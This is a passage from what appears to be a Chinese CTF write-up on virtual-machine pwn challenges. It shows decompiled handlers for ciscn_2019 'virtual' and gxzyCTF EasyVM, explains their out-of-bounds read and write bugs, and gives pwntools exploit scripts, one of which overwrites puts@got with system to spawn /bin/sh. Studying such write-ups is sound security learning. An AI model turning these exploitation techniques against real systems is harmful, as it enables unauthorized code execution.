class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your name : "</span>)</span><br><span class="line">p.sendline(<span class="string">'flag.txt'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input instruction : "</span>) </span><br><span class="line">payload=<span class="string">"\x01\x03\xff\xd8"</span> <span class="comment">#load 03,[0xffd8]  reg3&lt;=*(mem-40) 0xffd8 = -40</span></span><br><span class="line">payload+=<span class="string">"\x02\xff\xdc\x03"</span> <span class="comment">#store [0xffdc],03 *(mem-36)&lt;=reg3  0xffdc = -36</span></span><br><span class="line">payload+=<span class="string">"\x06"</span>                <span class="comment">#halt</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><p>来源：<a href="https://github.com/Dittozzz/ctf-pwn-writeup/tree/master/ciscn-2019/Virtual" target="_blank" rel="noopener">ciscn_2019_初赛_virtual</a></p><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/vmpwn/ciscn_2019_c_virtual/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>这道题相对上一道题复杂了许多，首先弄清楚程序逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *exec_name; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  section_info *stack_addr; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  section_info *text_addr; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> **data_addr; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  do_init();</span><br><span class="line">  exec_name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);  <span class="comment">//name存放在堆上</span></span><br><span class="line">  stack_addr = sub_4013B4(<span class="number">64</span>);          <span class="comment">//模拟栈，存放栈数据</span></span><br><span class="line">  text_addr = sub_4013B4(<span class="number">128</span>);          <span class="comment">//模拟代码段，存放指令</span></span><br><span class="line">  data_addr = (<span class="keyword">void</span> **)sub_4013B4(<span class="number">64</span>);  <span class="comment">//模拟数据段，存放数据</span></span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);       <span class="comment">//存放临时数据，有点cache的味道 </span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your program name:"</span>);</span><br><span class="line">  my_read_((__int64)exec_name, <span class="number">0x20</span>u);  <span class="comment">//直接写数据到name处</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your instruction:"</span>);</span><br><span class="line">  my_read_((__int64)ptr, <span class="number">0x400</span>u);       <span class="comment">//先写到cache中</span></span><br><span class="line">  StoreOpcode(text_addr, ptr);          <span class="comment">//再存入代码段</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your stack data:"</span>);</span><br><span class="line">  my_read_((__int64)ptr, <span class="number">0x400</span>u);       <span class="comment">//先写到cache中</span></span><br><span class="line">  StroeStack(stack_addr, ptr);          <span class="comment">//再存入栈中</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)run((__int64)text_addr) )   <span class="comment">//模拟执行</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-------"</span>);  </span><br><span class="line">    <span class="built_in">puts</span>(exec_name);                             <span class="comment">//打印name</span></span><br><span class="line">    puts_stack(stack_addr);                      <span class="comment">//打印栈数据</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-------"</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your Program Crash :)"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  my_free((<span class="keyword">void</span> **)text_addr);</span><br><span class="line">  my_free((<span class="keyword">void</span> **)stack_addr);</span><br><span class="line">  my_free(data_addr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果只看上面，大概可以想到：</p><p>1、name = ”/bin/sh\x00”, 利用漏洞将puts@got改成system地址</p><p>2、打印栈数据可以泄露一些地址</p><p>下面来看一下stack、text、data是如何存放数据的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">section_info *__<span class="function">fastcall <span class="title">sub_4013B4</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  section_info *result; <span class="comment">// rax</span></span><br><span class="line">  section_info *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ptr = (section_info *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);   <span class="comment">//存放结构体</span></span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">8L</span>L * size);    <span class="comment">//存放数据</span></span><br><span class="line">  <span class="keyword">if</span> ( s )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">8L</span>L * size);</span><br><span class="line">    ptr-&gt;section_ptr = (__int64)s;</span><br><span class="line">    ptr-&gt;size = size;     </span><br><span class="line">    ptr-&gt;numb = <span class="number">-1</span>;</span><br><span class="line">    result = ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00000000 section_info    struc ; (sizeof=0x10, mappedto_6)</span><br><span class="line">00000000 section_ptr     dq ?</span><br><span class="line">00000008 size            dd ?</span><br><span class="line">0000000C idx             dd ?</span><br><span class="line">00000010 section_info    ends</span><br></pre></td></tr></table></figure><p>下面再看一下两个操作数据的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall Get(section_info *text_addr, _QWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  if ( !text_addr )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( text_addr-&gt;numb == -1 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *a2 = *(_QWORD *)(text_addr-&gt;section_ptr + 8LL * text_addr-&gt;numb--);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Get(addr, a): 从addr从取数据到a中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall StoreInSection(section_info *a1, __int64 data)</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( !a1 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  idx = a1-&gt;numb + 1;                          </span><br><span class="line">  if ( idx == a1-&gt;size )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *(_QWORD *)(a1-&gt;section_ptr + 8LL * idx) = data;</span><br><span class="line">  a1-&gt;numb = idx;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StoreInSection(a1, data)：将data存放到a中</p><h4 id="指令功能"><a href="#指令功能" class="headerlink" title="指令功能"></a>指令功能</h4><p>共有7个指令：push、pop、add、sub、mul、div、load、save</p><p>push：从stack_addr中取出数据放进data_addr中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">do_PUSH</span><span class="params">(section_info *data_addr, section_info *stack_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(stack_addr, &amp;v3) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)StoreInSection(data_addr, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pop：从data_addr中取出数据放进stack_addr中，与push刚好相反</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">do_POP</span><span class="params">(section_info *data_addr, section_info *stack_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v3) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)StoreInSection(stack_addr, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add：从data_addr中取出两个数据相加再存入data_addr；sub、mul、div类似</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">do_ADD</span><span class="params">(section_info *data_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v2) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v3) )</span><br><span class="line">    result = StoreInSection(data_addr, v3 + v2);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>load：从data_addr中取出数据作为data_addr的索引，再将该索引指向的数据存放到data_addr中，由于没有进行索引的判断，因此可以造成越界读</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">do_LOAD</span><span class="params">(section_info *data_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;idx) )</span><br><span class="line">    result = StoreInSection(data_addr, *(_QWORD *)(data_addr-&gt;section_ptr + <span class="number">8</span> * (data_addr-&gt;numb + idx)));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>save：从data_addr中取出两个数据，将第二个数据写入第一个数据相关的索引中，存在越界写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">do_SAVE</span><span class="params">(section_info *data_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 value; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v2) || !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;value) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)(<span class="number">8</span> * (data_addr-&gt;numb + v2) + data_addr-&gt;section_ptr) = value;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如：利用save将data_addr覆盖成0x400</p><p><img alt="" data-src="/2020/04/10/虚拟指令集pwn/1.png" class="lazyload"></p><p>利用思路：</p><p>1、先把got表写入data_addr-&gt;section_ptr处：push got_addr；push -3；save</p><p>2、load put@got，加上它与system@got的偏移：push 5；load；push offset；add</p><p>3、将该地址写入put@got的地址处：push 5；save</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">(s=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,s)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">ins = <span class="string">"push push save push load push add push save"</span></span><br><span class="line">p.sendlineafter(<span class="string">'instruction:\n'</span>, ins)</span><br><span class="line"></span><br><span class="line">offset = -(libc.sym[<span class="string">'puts'</span>] - libc.sym[<span class="string">'system'</span>])</span><br><span class="line">got_addr = <span class="number">0x404000</span></span><br><span class="line">data = [got_addr,<span class="number">-3</span>,<span class="number">5</span> ,offset ,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    payload+=str(i)+<span class="string">" "</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gd('b *0x401A75\nb *0x4019C7\nb*0x401A5D\n')</span></span><br><span class="line">p.sendlineafter(<span class="string">'data:\n'</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><p>来源：<a href="https://adworld.xctf.org.cn/media/uploads/task/f73efe174bb6478781a72677aea0235d.zip" target="_blank" rel="noopener">gxzyCTF-EasyVM</a></p><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/vmpwn/easyVM/attachment/EasyVM&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="程序逻辑-1"><a href="#程序逻辑-1" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST2C_4</span></span><br><span class="line">  _DWORD *ptr; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+ACh] [ebp+7Ch]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  ptr = sub_DD5();    <span class="comment">//定义一些寄存器</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                    </span><br><span class="line">        buf = <span class="built_in">malloc</span>(<span class="number">0x300</span>u); </span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x2FF</span>u);  <span class="comment">//读入指令</span></span><br><span class="line">        ptr[<span class="number">8</span>] = buf;          <span class="comment">//地址存放在ptr[8]中</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !ptr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        vm(ptr);               <span class="comment">//定义了指令集</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !ptr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr[<span class="number">10</span>]);</span><br><span class="line">        <span class="built_in">free</span>(ptr);             <span class="comment">//有点东西</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Maybe a bug is a gif?"</span>);</span><br><span class="line">        dword_305C = v5;       <span class="comment">//程序的地址</span></span><br><span class="line">        ptr[<span class="number">8</span>] = &amp;unk_3020;    <span class="comment">//存入一些指令</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Zzzzzz........"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Are you kidding me ?"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到case 3，大概可以想到要把free(ptr)修改成system(“/bin/sh”)</p><p>先来看指令集，指令集只是定义了一些运算，下面介绍几个主要的</p><p>0x80：以下一个指令为索引idx，把下2到5个字节为值传入寄存器a1[idx]</p><p>例如：’\x80\x02\x00\x96\xF3\x78’就是a1[2] = 0x78F39600</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x80</span>u )</span><br><span class="line">&#123;</span><br><span class="line">  a1[sub_9C3((<span class="keyword">int</span>)a1, <span class="number">1u</span>)] = *(_DWORD *)(a1[<span class="number">8</span>] + <span class="number">2</span>);</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x09与0x11：把dword_305C中的值打印出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">9</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1[<span class="number">1</span>] = dword_305C;</span><br><span class="line">  ++a1[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x11</span> )              </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, a1[<span class="number">1</span>]);</span><br><span class="line">  ++a1[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x53与0x54: 输出一个字节和输入一个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x53</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">putchar</span>(*(<span class="keyword">char</span> *)a1[<span class="number">3</span>]);</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x54</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = (_BYTE *)a1[<span class="number">3</span>];</span><br><span class="line">  *v1 = getchar();</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x71接0x76：相当于a1[3] = <em>(_DWORD </em>)(a1[8] + 1);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x71</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1[<span class="number">6</span>] -= <span class="number">4</span>;</span><br><span class="line">  *(_DWORD *)a1[<span class="number">6</span>] = *(_DWORD *)(a1[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x76</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1[<span class="number">3</span>] = *(_DWORD *)a1[<span class="number">6</span>];</span><br><span class="line">  *(_DWORD *)a1[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">6</span>] += <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实弄清楚&amp;unk_3020中的指令就差不多了，该指令首先给dword_305C赋值，然后对该值进行一系列运算并打印出来，根据该运算特征可以发现是MT19937随机数算法，可以利用Z3约束器进行求解（参考<a href="http://ctf.njupt.edu.cn/382.html#EasyVM）" target="_blank" 